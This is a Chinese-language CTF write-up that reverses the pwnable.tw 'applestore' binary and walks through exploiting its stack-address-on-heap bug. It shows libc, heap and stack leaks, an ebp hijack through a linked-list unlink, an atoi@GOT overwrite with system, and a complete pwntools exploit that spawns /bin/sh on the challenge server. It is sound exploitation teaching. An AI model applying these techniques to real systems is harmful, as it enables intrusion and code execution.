## 检查

```c
$ file applestore 
applestore: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.24, BuildID[sha1]=35f3890fc458c22154fbc1d65e9108a6c8738111, not stripped
$ checksec applestore 
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

## 分析

运行可知是经典的菜单题

```
$ ./applestore 
=== Menu ===
1: Apple Store
2: Add into your shopping cart
3: Remove from your shopping cart
4: List your shopping cart
5: Checkout
6: Exit
```

### main

程序的逻辑首先在main函数中初始化一个全局变量myCart为0，该变量位于bss段，大小为0x10，然后打印menu，进入handler函数

> main函数中还有两个限制时间反调试的函数，可以patch掉以便于后续的调试，但是有点诡异的是无法保存修改，经过尝试发现关闭ida的时候先保存database，然后再次打开即可，之后不保存database，原文件也可保存修改

### handler

首先会调用my_read函数，读取大小为0x15的用户输入到栈上，然后将用户输入通过atoi()函数转化为整型，然后根据结果执行相应功能

### my_read

此函数调用read函数进行输入，同时将用户输入的最后补0，需要注意的是，保存用户输入的nptr与代表canary的变量v2相差0x22-0xc=0x16个字节，所以并不会破坏canary变量

### add

通过my_read函数往栈上写用户的输入，然后用atoi转换，然后调用create与insert函数完成了往购物车的添加功能

### create

create函数申请0x10的内存，实际返回的堆块大小为0x18，因为0x10大小的堆块最大存储用户数据为0xc，32位下再大一点的堆块大小就是0x18，可以存储的数据的空间为0x14，满足用户请求

> 这里可以看出v2和v3其实是一个变量，所以我们可以在v3变量出点右键，选择`map to another variable`（快捷键=），选择v2，即可使结果更好看

create函数的第一个参数为手机名字的字符串常量，第二个参数为对应的手机价格。其中调用了asprintf这个函数，这个函数可以根据格式化字符串的最终结果长度自动的申请堆空间的内存，存放字符串，并且将字符串地址赋值给第一个参数。不过通过这种方式申请的堆空间需要用户手动释放。所以可以看到create函数，申请16字节的内存，前4个字节存放了asprintf自动申请，存储手机名的堆的地址，然后4个字节存放的是整型的手机价格，后面的8个字节都是0，用来做什么暂时不知道。返回值为堆块的数据部分的地址，然后add函数将这个地址传入到insert中

### insert

```c
int __cdecl insert(int a1)
{
  int result; // eax
  _DWORD *i; // [esp+Ch] [ebp-4h]

  for ( i = &myCart; i[2]; i = (_DWORD *)i[2] )
    ;
  i[2] = a1;
  result = a1;
  *(_DWORD *)(a1 + 12) = i;
  return result;
}
```

这个循环有一点复杂，我们按照购物车的添加来推演这个函数

1. 第一次购买手机加入购物车时，myCart往后这0x10字节的内存（位于bss段）都是0。所以i就是myCart的地址，`i[2]`为0，跳出循环。然后将`i[2]`也就是`*(&myCart+2)`赋值为create返回的堆块的地址。然后将堆块偏移12即，堆块最后4个字节赋值为i，即&myCart。
2. 第二次购买手机加入购物车时，for循环第一次不跳出，因为上一次`i[2]`有值，为上一次create的堆块的地址，所以根据for的赋值语句，i赋值为上一个堆块的起始地址，然后将`i[2]`，也就是上一个堆块的第三个4字节赋值为当前堆块的首地址。最后将当前堆块的最后四个字节赋值为前一个堆块的首地址。
3. 以此类推，myCart是16个字节，每次create的堆块也是16个字节，insert相当于把每次添加进购物车的手机组织成一个不循环的双链表，每次添加一个手机就是往双链表最后添加一个节点，具体这个双链表的数据结构见后文

### delete

双链表的删除

假如p为指向要删除的节点的指针，则内存的变化，可抽象的表示：

```
p -> fd -> bk = p -> bk
p -> bk -> fd = p -> fd
```

加上这个节点本身的数据结构的条件，内存的变化即为：

```
fd[3]=bk
bk[2]=fd
```

### cart

确认输入的是不是字符y，如果是，则遍历双链表打印购物车内容，返回购物车内商品总价格。这些能打印的函数，在题目中一般都可以用作信息泄露。

### checkout

调用cart，可以打印购物的的内容，然后如果总价格为7174，则可以将1美元的iphone8添加到购物车里，v2存储asprintf出来的字符串地址，v3为价格。

触发需要总价格达到7174，iphone的售价分别是199，299，399，499，可以用z3求解

```python
from z3 import *
a,b,c,d=Ints('a b c d')
s=Solver()
s.add(a>0,b>0,c>0,d>0)
s.add(199*a + 299*b + 499*c + 399*d == 7174)
print(s.check())
print(s.model())
```

解得

```
sat
[b = 3, a = 16, c = 3, d = 4]
```

## 数据结构

本题设计了一个双链表，每个链表的节点是16字节，存在4个元素，分别为手机名字的字符串地址(&name)，手机价格(price)，链表前向指针(fd)，链表后向指针(bk)，理解这个数据结构是明白本题的关键。当已经加入了一些手机到购物车后，myCart这个位于bss段的节点，充当双链表的表头，其后的节点均为堆空间的内存块：

![](https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-applestore-1.png)

然后是主要用到这个数据结构的几个函数：

- add: 完成双链表节点的插入
- delete: 完成双链表节点的删除
- cart: 完成双链表节点的遍历，打印每个节点的第一个元素指向的字符串
- checkout: 可以完成双链表节点的遍历，触发彩蛋可以完成一次双链表节点的插入，而且节点位于栈上

## 漏洞点

我们触发一下彩蛋

```python
from pwn import *
context(arch='i386',os='linux',log_level='debug')

debug = 1
if debug:
	elf = ELF("./applestore")
	libc = ELF("./libc-2.23.so")
	io = process("applestore")
else:
	elf = ELF("./silver_bullet")
	libc = ELF("./libc_32.so.6")
	io = remote("chall.pwnable.tw",10103)
	
add = '2';delete='3';cart='4';checkout='5'
def action(num,payload):
    io.sendlineafter('> ',num)
    io.sendlineafter('> ',payload)

for i in range(16):
    action(add,'1')
for i in range(3):
    action(add,'2')
for i in range(3):
    action(add,'3')
for i in range(4):
    action(add,'4')
action(checkout,'y')

io.recv()

io.interactive()
```

执行发现确实触发了

```
    '20: iPad Air 2 - $499\n'
    '21: iPad Air 2 - $499\n'
    '22: iPad Air 2 - $499\n'
    '23: iPad Mini 3 - $399\n'
    '24: iPad Mini 3 - $399\n'
    '25: iPad Mini 3 - $399\n'
    '26: iPad Mini 3 - $399\n'
    '*: iPhone 8 - $1\n'
```

但是当我们再次与程序进行交互，执行选项4打印购物车列表时，发现出现崩溃了

```
23: iPad Mini 3 - $399
24: iPad Mini 3 - $399
25: iPad Mini 3 - $399
26: iPad Mini 3 - $399
27: �T�\x0e- $-136445328
[*] Process './applestore' stopped with exit code -11 (SIGSEGV) (pid 25204)
[*] Got EOF while reading in interactive
```

这其实是因为，我们加入到链表中的栈地址的iphone8的数据已经失效了，这段栈空间被其他的函数所利用，所以是失效的数据，在执行cart的过程中，需要访问每一个节点的第一个元素所指向的地址，如果是错误的数据，很有可能这个地址处于不可访问的内存，导致程序崩溃。这也正是本题的漏洞所在

## 利用

### 栈平衡与计算

以往我们熟悉的栈操作都是在一个函数内，比如函数内的局部变量距离ebp的偏移，直接用IDA看就可以了。但是如果出了这个函数后，这个未清空的原来的变量的栈地址，被别的函数利用了，这里有三个问题：

1. 原来的变量距离现在的ebp的偏移是确定的么？
2. 如果是，这个偏移和距离原来ebp的偏移是相同的么？
3. 如果偏移不同，这个偏移怎么计算？

这三个问题都需要确定程序当前所在的函数，而且真的想要好好回答这个问题，那么一切就要从栈帧说起

#### 栈帧

关于栈帧的界定有两种说法：

![](https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-applestore-2.png)

- 栈帧包括当前函数的参数，不包括所调用函数的参数
- 栈帧不包括当前函数的参数，包括所调用函数的参数

第二种说法比较常见，参考：[函数调用过程&栈帧&调用约定](https://blog.csdn.net/zrf2112/article/details/95661316)

从一个时刻的状态来看，的确第二种更合理。但是如果函数的调用过程来看，从被调函数回到了调用者函数后，被调函数的参数一定会被平衡，无论这个平衡是由被调函数还是调用者函数做的。所以当被调用函数完全消失时，当前栈的状态恢复成没有压被调函数的参数时的状态，然后调用者函数可能继续去调用其他函数。所以从这个角度来看，栈帧包括当前函数的参数是更加合理的。所以之后的讨论均采用第一种说法，即:

- 栈帧包括当前函数的参数，不包括所调用函数的参数
- esp指向栈顶，ebp指向栈低，但栈顶到栈低不是整个栈帧
- 并且以下讨论不包括调用alloca函数在栈上动态申请内存

我们假设如下情景：无参数的func1，分别调用有一个参数的fun2，有一个参数的fun3，有两个参数的fun4，在调用过程中栈帧的变化如下，图中P标记的含义为一个参考地址，固定不动的一个地址：

![](https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-applestore-3.png)

如果看明白了这个调用过程，便可以清晰的回答上面三个问题

#### 问题的答案

![](https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-applestore-4.png)

1. 无论在哪个函数中，原来的变量如func2 local var，在以上5种情况中，均距离当前的ebp的偏移是固定的，可计算的。
2. 这个偏移和距离原来的ebp的偏移不一定相同，例如在第2，4，5，情况中不同，在3情况中相同。
3. 可以根据函数调用关系以及函数参数所占用空间进行计算。例如fun3与fun2被fun1的调用关系一致，fun3与fun2均只有一个参数，且fun1在调用fun3和fun2之前没有进行奇怪的栈操作，则原来变量距离ebp的偏移和距离现在ebp的偏移相同。

#### 本题的栈帧

可以看一下handler函数的汇编：

```asm
.text:08048C31                 jmp     eax             ; switch jump
.text:08048C33 ; ---------------------------------------------------------------------------
.text:08048C33
.text:08048C33 loc_8048C33:                            ; CODE XREF: handler+5E↑j
.text:08048C33                                         ; DATA XREF: .rodata:08049088↓o
.text:08048C33                 call    list            ; jumptable 08048C31 case 1
.text:08048C38                 jmp     short loc_8048C63
.text:08048C3A ; ---------------------------------------------------------------------------
.text:08048C3A
.text:08048C3A loc_8048C3A:                            ; CODE XREF: handler+5E↑j
.text:08048C3A                                         ; DATA XREF: .rodata:08049088↓o
.text:08048C3A                 call    add             ; jumptable 08048C31 case 2
.text:08048C3F                 jmp     short loc_8048C63
.text:08048C41 ; ---------------------------------------------------------------------------
.text:08048C41
.text:08048C41 loc_8048C41:                            ; CODE XREF: handler+5E↑j
.text:08048C41                                         ; DATA XREF: .rodata:08049088↓o
.text:08048C41                 call    delete          ; jumptable 08048C31 case 3
.text:08048C46                 jmp     short loc_8048C63
.text:08048C48 ; ---------------------------------------------------------------------------
.text:08048C48
.text:08048C48 loc_8048C48:                            ; CODE XREF: handler+5E↑j
.text:08048C48                                         ; DATA XREF: .rodata:08049088↓o
.text:08048C48                 call    cart            ; jumptable 08048C31 case 4
.text:08048C4D                 jmp     short loc_8048C63
.text:08048C4F ; ---------------------------------------------------------------------------
.text:08048C4F
.text:08048C4F loc_8048C4F:                            ; CODE XREF: handler+5E↑j
.text:08048C4F                                         ; DATA XREF: .rodata:08049088↓o
.text:08048C4F                 call    checkout        ; jumptable 08048C31 case 5
.text:08048C54                 jmp     short loc_8048C63
.text:08048C56 ; ---------------------------------------------------------------------------
```

故进入每一个函数时，handler的栈帧是相同的，且这几个函数均没有参数，所以进入这些函数后，ebp寄存器的值也全部相同，即如果进入一个函数中存在一个局部变量，则当进入其他函数时，这个局部变量当时的存在位置，距离现在函数的ebp的偏移均与原来相等。

#### 局部变量的生命周期

局部变量只在当前的函数内部，或者当前函数调用的子函数中可以使用。当前函数返回后，局部变量的生命周期结束，其所处的栈空间便成为垃圾数据，待之后的函数栈帧覆盖到这里时，一般来说会对栈上的值进行初始化。如果没有则可能存在未初始化数据的漏洞，不过此题不属于这种漏洞类型。因为此题的漏洞本质是将一个局部变量的地址，放到了堆上，堆是个全局的数据。于是发生了当局部变量的生命周期结束后，仍然被使用的情景，类似UAF。**把栈的地址传出去了，这是个很危险的操作**

#### 垃圾栈数据导致崩溃与利用

刚才程序运行崩溃是因为，那个被记录到堆上的栈地址所对应的栈空间，在打印的过程中被其他函数所使用，例如printf等，其内容可以等同于垃圾，于是在按照程序的逻辑执行就可能会访问到非法的地址，进而程序崩溃。但是本题的这些函数，均可以通过输入控制这块栈空间。具体来说这个栈空间，即为checkout函数中ebp-0x20到ebp-0x10这段内存：

```c
unsigned int checkout()
{
  int v1; // [esp+10h] [ebp-28h]
  char *v2; // [esp+18h] [ebp-20h]
  int v3; // [esp+1Ch] [ebp-1Ch]
  unsigned int v4; // [esp+2Ch] [ebp-Ch]
```

通过了解本题的栈帧我们知道add,delete,cart,checkout，进入这四个函数后，ebp的值是相同的，并且可以将输入的字符串存储到自己的栈上，例如cart函数：

```c
int cart()
{
  signed int v0; // eax
  signed int v2; // [esp+18h] [ebp-30h]
  int v3; // [esp+1Ch] [ebp-2Ch]
  _DWORD *i; // [esp+20h] [ebp-28h]
  char buf; // [esp+26h] [ebp-22h]
  unsigned int v6; // [esp+3Ch] [ebp-Ch]

  v6 = __readgsdword(0x14u);
  v2 = 1;
  v3 = 0;
  printf("Let me check your cart. ok? (y/n) > ");
  fflush(stdout);
  my_read(&buf, 0x15u);
  if ( buf == 121 )
```

输入的buf被存储到栈上距离ebp偏移为-0x22字节，故只要跳过前两个字节，即可以控制那段checkout中的目标内存。而且允许输入的大小为0x15，长度完全够用，只要第一个字符为y，便可以进入打印逻辑。再例如delete函数中的输入逻辑：

```c
unsigned int delete()
{
  signed int v1; // [esp+10h] [ebp-38h]
  _DWORD *v2; // [esp+14h] [ebp-34h]
  int v3; // [esp+18h] [ebp-30h]
  int v4; // [esp+1Ch] [ebp-2Ch]
  int v5; // [esp+20h] [ebp-28h]
  char nptr; // [esp+26h] [ebp-22h]
  unsigned int v7; // [esp+3Ch] [ebp-Ch]

  v7 = __readgsdword(0x14u);
  v1 = 1;
  v2 = (_DWORD *)dword_804B070;
  printf("Item Number> ");
  fflush(stdout);
  my_read(&nptr, 0x15u);
  v3 = atoi(&nptr);
```

可见，delete和cart的输入偏移是一致的，均为ebp-22h，不过最后输入需要经过atoi转换成整型，才能进行正常的删除操作。所以这里可以用0x00截断的方式来填充前2个字节，也就是说我们只能控制个位编号的元素删除。有了如上的利用方式，我们就能伪造一个节点，进行打印或者删除操作。那我们利用打印或者删除能做什么呢？一般打印是信息泄露，删除是内存写。

### 泄露libc基址和heap段地址

首先一般是信息泄露，本题我们可以首先泄露libc基址，以及堆段的地址。不过泄露有啥用呢？暂时看不出来。我们通过cart函数便可以打印双链表的一些数据，并且我们控制第27个节点，即栈上的内存。我们可以构造如下节点：

- 前四个字节为漏洞程序的GOT表中一项的地址
- 再四个字节随意
- 再四个字节为&myCart+2，即0x804B070
- 最后四个字节随意

即：`payload = 'y\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32()`，如图的stack节点，构造完之后的链表结构如下，bk回边未画出：

![](https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-applestore-5.png)

构造如上节点后，cart函数在遍历打印的时候，遍历到第27个节点时，就会按照我们构造的数据去执行打印，并继续遍历，所以就会把`ELF.GOT['puts']`地址处的内容打印出来，在减去libc中puts函数的偏移就能泄露出来libc的基址。

在继续遍历的时候就会将`&myCart + 2`的地址处识别为一个节点的开头，然后打印这个节点第一个元素所指向的内存，作为第28个节点的打印数据。这个指针本身是指向第一个节点，所以我们就会把第1个节点的数据打印出来直到遇到0x00。第1个节点的前四个字节是asprintf出来的堆块的地址，存储着iphone6这类的字符串。这个地址和堆空间其起始的地址偏移是固定的，所以我们也可以泄露出来堆段的地址。但是我们不知道偏移的具体大小，需要调试，这里我们需要使用本地的libc的信息，32位的一般位于`/lib/i386-linux-gnu/libc.so.6`：

> 此处的libc.so.6是一个软链接，指向当前目录下的libc-2.23.so

> 有意思的是这里我的ubuntu16崩了，我导入快照发现/lib下并没有i386-linux-gnu，此时调用的是/lib32/libc-2.23.so，安装完pwndbg后i386-linux-gnu出现了，这时候查看发现调用的是/lib/i386-linux-gnu/libc-2.23.so

```python
from pwn import *
context(arch='i386',os='linux',log_level='debug')

debug = 1
if debug:
	elf = ELF("./applestore")
	libc = ELF("./my_ubuntu32_libc.so")
	io = process("applestore")
else:
	elf = ELF("./silver_bullet")
	libc = ELF("./libc_32.so.6")
	io = remote("chall.pwnable.tw",10103)
	
add = '2';delete='3';cart='4';checkout='5'
def action(num,payload):
    io.sendlineafter('> ',num)
    io.sendlineafter('> ',payload)

for i in range(16):
    action(add,'1')
for i in range(3):
    action(add,'2')
for i in range(3):
    action(add,'3')
for i in range(4):
    action(add,'4')
action(checkout,'y')

payload = 'y\x00'+p32(elf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)
action(cart,payload)

io.recvuntil('27: ')
libc_addr = u32(io.recv(4))-libc.symbols['puts']
io.recvuntil('28: ')
heap_addr = u32(io.recv(4))

log.warn('libc_addr: 0x%x' % libc_addr)
log.warn('heap_addr: 0x%x' % heap_addr)

gdb.attach(io,'b * 0x8048beb')

io.interactive()
```

打印地址如下：

```c
[!] libc_addr: 0xf7dda000
[!] heap_addr: 0x81cc490
```

查看libc起始地址

```c
0xf7dda000 0xf7f8a000 r-xp   1b0000 0      /lib/i386-linux-gnu/libc-2.23.so
```

查看堆块地址，可得堆基址为0x81cc000

> pwndbg前面现实的地址为堆块的起始地址，而非数据地址

```c
pwndbg> heap
0x81cc000 PREV_INUSE {
  prev_size = 0, 
  size = 1033, 
  fd = 0x203a203e, 
  bk = 0x81cc490, 
  fd_nextsize = 0x202d20c7, 
  bk_nextsize = 0x80a3024
}
```

可得我们泄漏出的地址0x81cc490比堆基址多出来了0x490的偏移，故袖子

```python
io.recvuntil('27: ')
libc_addr = u32(io.recv(4)) - libc.symbols['puts']
io.recvuntil('28: ')
heap_addr = u32(io.recv(4)) - 0x490
```

至于这个偏移为啥是固定的，应该是程序每次的堆操作都是固定的，所以偏移也是固定的。这个偏移中还存在着asprintf的堆操作，所以不同版本的libc可能偏移时不同的，但是同一个libc下应该是固定的。

### 泄漏栈地址

在 Linux 系统中，glibc 的环境指针 environ(environment pointer) 为程序运行时所需要的环境变量表的起始地址，环境表中的指针指向各环境变量字符串。因此，**可通过 environ 指针泄露栈地址**。

```python
environ_libc = libc_addr + libc.symbols['environ']
payload = 'ya' + p32(environ_libc) + 'a'*0x4 + p32(0)
action(cart,payload)
io.recvuntil("27: ")
stack_addr = u32(io.recv(4))

log.warn('stack_addr: 0x%x' % stack_addr)
```

可得

```c
[!] stack_addr: 0xffc4770c
```

### delete一次有约束的地址写

虽然我们会获得一次写操作，可以将got表中atoi的地址覆盖成system的地址，但是之后会对libc中的system函数进行写操作，而代码段是只读的，程序会崩溃

假如p为指向要删除的节点的指针，则内存的变化，可抽象的表示：

```
p -> fd -> bk = p -> bk
p -> bk -> fd = p -> fd
```

加上这个节点本身的数据结构的条件，内存的变化即为：

```
fd[3]=bk
bk[2]=fd
```

```
为满足上面的约束条件可以有两种情况：

(第一种)
令: fd[3] = * atoi@got , bk = system@libc
即: fd + 0xc = atoi@got , bk = system@libc
即: fd = atoi@got - 0xc , bk = system@libc
故: fd[3] = bk , 即完成* atoi@got = system@libc赋值操作

但: bk[2] = * (system@libc + 2)
若: bk[2] = fd , 进行赋值
则: * (system@libc + 2) = atoi@got - 0xc，即对libc中的system函数进行写操作，代码段是只读的，程序会崩溃


(第二种)
令: bk[2] = * atoi@got , fd = system@libc
即: bk + 0x8 = atoi@got , fd = system@libc
即: bk = atoi@got - 0x8 , fd = system@libc
故: bk[2] = fd , 即完成* atoi@got = system@libc赋值操作

但: fd[3] = * (system@libc + 3)
若: fd[3] = bk , 进行赋值
则: * (system@libc + 3) = atoi@got - 0x8，即对libc中的system函数进行写操作，代码段是只读的，程序会崩溃
```

### 劫持ebp并覆盖GOT表

我们可以通过对ebp进行劫持，从而使栈位于我们想要的地方，然后通过输入覆盖got表中的atoi函数为system

我们是通过delete函数满足约束条件的去写old_ebp，为GOT表的地址。首先想到GOT表位于可写的段，所以GOT表+2,+3的地址是data段，也是可写的，并不会崩溃，条件成立

那我们就需要通过调试算出偏移得到delete函数的ebp地址

```
[!] stack_addr: 0xffbf4fdc
```

![](https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-applestore-6.png)

因为我们控制的是链表的bk，但是实际写入的地方是bk[2]，所以可得：

stack_addr - offset - 0x8 = delete_ebp_addr

offset = 0xffbf4fdc - 0xffbf4ed8 - 0x8 = 0x10c

然后我们需要让我们在handler函数中用my_read写入的地址为atoi_got，所以我们需要将delete_ebp_addr处的值更改为atoi_got + 0x22

![](https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-applestore-7.png)

故我们控制的第27个节点结构如下

```
           +--------------------+
           |                    |
   fd ---->+      fake str      |
           |                    |
           +--------------------+
           |                    |
           |                    |
           |                    |
           +--------------------+
           |                    |
       (fd)|   atoi_got + 0x22  |
           |                    |
           +--------------------+
           |                    |
       (bk)| stack_addr - 0x10c |
           |                    |
           +--------------------+
```

fd[3]=bk ----- 修改got表上内容，可写不会报错
bk[2]=fd ----- 使handler函数的ebp变为atoi_got + 0x22

### get shell

此时我们输入的str的前四个字节会覆盖掉got表中的atoi，然后把str当作参数执行

所以我们只需要构造payload：

payload = p32(system) + ";/bin/sh"

## exp

```python
from pwn import *
context(arch='i386',os='linux',log_level='debug')

debug = 0
if debug:
	elf = ELF("./applestore")
	libc = ELF("./my_ubuntu32_libc.so")
	io = process(elf.path)
else:
	elf = ELF("./applestore")
	libc = ELF("./libc_32.so.6")
	io = remote("chall.pwnable.tw",10104)

add = '2';delete='3';cart='4';checkout='5'
def action(num,payload):
    io.sendlineafter('> ',num)
    io.sendlineafter('> ',payload)

for i in range(16):
    action(add,'1')
for i in range(3):
    action(add,'2')
for i in range(3):
    action(add,'3')
for i in range(4):
    action(add,'4')
action(checkout,'y')

payload = 'y\x00'+p32(elf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)
action(cart,payload)

io.recvuntil('27: ')
libc_addr = u32(io.recv(4))-libc.symbols['puts']
io.recvuntil('28: ')
heap_addr = u32(io.recv(4))

environ_libc = libc_addr + libc.symbols['environ']

payload = 'y\x00' + p32(environ_libc) + 'a'*0x4 + p32(0)
action(cart,payload)
io.recvuntil("27: ")
stack_addr = u32(io.recv(4))

log.warn('libc_addr: 0x%x' % libc_addr)
log.warn('heap_addr: 0x%x' % heap_addr)
log.warn('stack_addr: 0x%x' % stack_addr)

atoi_got = elf.got['atoi']
system = libc_addr + libc.symbols['system']

payload = '27' + p32(stack_addr) + p32(1)
payload += p32(atoi_got + 0x22) + p32(stack_addr - 0x10c)
action(delete,payload)

io.sendlineafter("> ", p32(system) + ";/bin/sh")
io.interactive()
```

## 总结

从内存的控制与寄存器的劫持角度来说，本题的总结如下：

1. 首先可以写部分栈内存，通过彩蛋的漏洞与函数栈的平衡关系，利用题目中的函数可以扩大可读内存的范围，读到了GOT表，读到了堆，进而泄露了libc，堆，栈的信息。
2. 再通过漏洞本身触发一个有约束的地址写，写栈上的old_ebp，程序leave时进而劫持ebp寄存器。
3. 劫持ebp后，便可以通过题目本身的函数，将输入存储到当前函数根据ebp所控制的栈上，变扩大可写的内存范围为GOT表
4. 并且控制的GOT表的内存也被当做栈使用，即可控制流劫持并填好相应的参数

所以还是那句话：**二进制漏洞利用的过程，就是一步步扩大可以控制的内存的范围**。控制寄存器的目的一般最终还是为了控制更大的内存范围，另外还有就是函数调用时传递的参数可能需要劫持寄存器。



参考：

- [和媳妇一起学Pwn 之 applestore](https://xuanxuanblingbling.github.io/ctf/pwn/2020/03/06/applestore/)
- [pwnable.tw applestore 经验总结](https://blog.csdn.net/qq_43189757/article/details/102850665)

